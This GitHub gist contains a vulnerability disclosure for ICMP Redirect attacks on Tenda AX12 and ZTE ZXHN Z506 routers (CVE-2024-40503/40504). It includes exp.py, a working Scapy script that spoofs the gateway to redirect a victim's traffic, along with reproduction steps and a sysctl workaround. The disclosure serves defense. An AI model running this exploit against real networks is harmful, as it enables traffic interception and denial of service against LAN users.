
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Mivik](https://avatars.githubusercontent.com/u/54128043?s=64&v=4)](/Mivik)

# [Mivik](/Mivik)/**[exp.py](/Mivik/8927ad100a638756e1fe214dd5fca5f9)**

Last active
July 13, 2024 13:01

Show Gist options

* [Download ZIP](/Mivik/8927ad100a638756e1fe214dd5fca5f9/archive/c41e1114bdff0fd98bf305974e9f75730e37b897.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Mivik/8927ad100a638756e1fe214dd5fca5f9.js&quot;&gt;&lt;/script&gt;
* Save Mivik/8927ad100a638756e1fe214dd5fca5f9 to your computer and use it in GitHub Desktop.

[Code](/Mivik/8927ad100a638756e1fe214dd5fca5f9)
[Revisions
3](/Mivik/8927ad100a638756e1fe214dd5fca5f9/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Mivik/8927ad100a638756e1fe214dd5fca5f9.js&quot;&gt;&lt;/script&gt;

Save Mivik/8927ad100a638756e1fe214dd5fca5f9 to your computer and use it in GitHub Desktop.

[Download ZIP](/Mivik/8927ad100a638756e1fe214dd5fca5f9/archive/c41e1114bdff0fd98bf305974e9f75730e37b897.zip)

ICMP Redirect attacks

 [Raw](/Mivik/8927ad100a638756e1fe214dd5fca5f9/raw/c41e1114bdff0fd98bf305974e9f75730e37b897/exp.py)

[**exp.py**](#file-exp-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import sys |
| --- | --- |
|  |  |
|  | from scapy.arch import conf, get\_if\_addr |
|  | from scapy.layers.inet import IP, ICMP |
|  | from scapy.sendrecv import sendp |
|  |  |
|  | if len(sys.argv) != 4: |
|  | print(f'Usage: {sys.argv[0]} <interface> <victim IP> <server IP>') |
|  | exit(1) |
|  |  |
|  | iface, victim, server = sys.argv[1:] |
|  |  |
|  | attacker = get\_if\_addr(iface) |
|  | gw = conf.route.route()[2] |
|  |  |
|  | sendp( |
|  | IP(src=gw, dst=victim) |
|  | / ICMP(type=5, code=1, gw=attacker) |
|  | / IP(src=victim, dst=server) |
|  | / ICMP(), |
|  | iface=iface, |
|  | ) |

 [Raw](/Mivik/8927ad100a638756e1fe214dd5fca5f9/raw/c41e1114bdff0fd98bf305974e9f75730e37b897/tenda-ax12.md)

[**tenda-ax12.md**](#file-tenda-ax12-md)

## Metadata

CVE ID: CVE-2024-40503

CWE-940: Improper Verification of Source of a Communication Channel

## Description

Tenda AX12 router (firmware version V16.03.49.18\_cn) has been confirmed to be vulnerable ICMP Redirect attacks. An attacker can hijack the victim's traffic by sending ICMP Redirect packets to the victim's device.

Please refer to the paper[1](#user-content-fn-1-f09c458fb6dacc71704b964208e8ba8a) for more details.

## Reproduction

Environment:

* Attacker and victim are in the same LAN.
* Victim accepts ICMP Redirect packets (which is default on most Linux distributions).

Steps:

1. Under initial conditions, the victim's traffic is routed through the gateway. `ping 8.8.8.8` should succeed on the victim's machine, and `ip route get 8.8.8.8` should yield the gateway's IP address.
2. The attacker sends an ICMP Redirect packet ([exp.py](./exp.py)) to the victim, redirecting traffic to the attacker's IP address.
3. The victim's traffic is now routed through the attacker. `ip route get 8.8.8.8` would now yield the attacker's IP address, and the connection to `8.8.8.8` would fail.

Above demonstrates a DoS attack. This vulnerability can also be exploited to intercept the victim's traffic.

## Workaround

Before this vulnerability is fixed by the vendor, users can disable ICMP Redirect acceptance on their devices. On Linux, this can be done by running `sysctl -w net.ipv4.conf.all.accept_redirects=0`.

## Credit

Shiyao Guo, Ke Xu, Xuewei Feng, Qi Li, Yuxiang Yang

## Footnotes

1. Feng, Xuewei, et al. "Man-in-the-middle attacks without rogue AP: when WPAs meet ICMP redirects." 2023 IEEE Symposium on Security and Privacy (SP). IEEE, 2023. [↩](#user-content-fnref-1-f09c458fb6dacc71704b964208e8ba8a)

 [Raw](/Mivik/8927ad100a638756e1fe214dd5fca5f9/raw/c41e1114bdff0fd98bf305974e9f75730e37b897/zte-zxhn-z506.md)

[**zte-zxhn-z506.md**](#file-zte-zxhn-z506-md)

## Metadata

CVE ID: CVE-2024-40504

CWE-940: Improper Verification of Source of a Communication Channel

## Description

ZTE ZXHN Z506 router (firmware version V1.0.0.2B2.8000) has been confirmed to be vulnerable ICMP Redirect attacks. An attacker can hijack the victim's traffic by sending ICMP Redirect packets to the victim's device.

Please refer to the paper[1](#user-content-fn-1-d8c670ef23d31d88e390532ccd6e2571) for more details.

## Reproduction

Environment:

* Attacker and victim are in the same LAN.
* Victim accepts ICMP Redirect packets (which is default on most Linux distributions).

Steps:

1. Under initial conditions, the victim's traffic is routed through the gateway. `ping 8.8.8.8` should succeed on the victim's machine, and `ip route get 8.8.8.8` should yield the gateway's IP address.
2. The attacker sends an ICMP Redirect packet ([exp.py](./exp.py)) to the victim, redirecting traffic to the attacker's IP address.
3. The victim's traffic is now routed through the attacker. `ip route get 8.8.8.8` would now yield the attacker's IP address, and the connection to `8.8.8.8` would fail.

Above demonstrates a DoS attack. This vulnerability can also be exploited to intercept the victim's traffic.

## Workaround

Before this vulnerability is fixed by the vendor, users can disable ICMP Redirect acceptance on their devices. On Linux, this can be done by running `sysctl -w net.ipv4.conf.all.accept_redirects=0`.

## Credit

Shiyao Guo, Ke Xu, Xuewei Feng, Qi Li, Yuxiang Yang

## Footnotes

1. Feng, Xuewei, et al. "Man-in-the-middle attacks without rogue AP: when WPAs meet ICMP redirects." 2023 IEEE Symposium on Security and Privacy (SP). IEEE, 2023. [↩](#user-content-fnref-1-d8c670ef23d31d88e390532ccd6e2571)

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FMivik%2F8927ad100a638756e1fe214dd5fca5f9)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

